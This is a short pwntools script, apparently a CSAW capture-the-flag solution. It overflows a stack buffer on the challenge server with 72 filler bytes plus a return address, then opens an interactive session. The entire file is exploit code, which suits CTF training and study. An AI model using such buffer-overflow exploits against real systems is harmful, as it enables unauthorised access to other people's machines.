from pwn import *

r = remote('pwn.chal.csaw.io', 5000)

payload = b'a'*72
payload += p64(0x401172)

r.recvuntil(b'Enter the password to get in:')
r.sendline(payload)
r.interactive()

